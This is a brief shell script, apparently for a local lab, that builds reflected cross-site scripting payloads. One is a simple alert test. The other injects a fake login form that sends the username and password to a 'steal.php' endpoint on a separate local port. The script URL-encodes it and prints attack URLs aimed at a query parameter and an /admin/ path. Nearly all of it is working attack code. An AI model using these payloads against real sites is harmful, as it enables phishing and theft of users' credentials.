PAYLOAD='alert(%22xss%22)%3B'

PAYLOAD="
document.write(\"<form action='http://localhost:9090/steal.php'><label for='user'>User:</label><br><input type='text' id='user' name='user'><br><label for='password'>Password:</label><br><input type='text' id='password' name='password'><br><input type='submit' value='Login'></form>\")"




PAYLOAD=$( urlencode "$PAYLOAD" )
echo Visit: 'http://localhost:8080?payload=%3Cscript%3E'$PAYLOAD'%3C%2Fscript%3E'
echo
echo Visit: 'http://localhost:8080/admin/%3Cscript%3E'$PAYLOAD'%3C%2Fscript%3E'
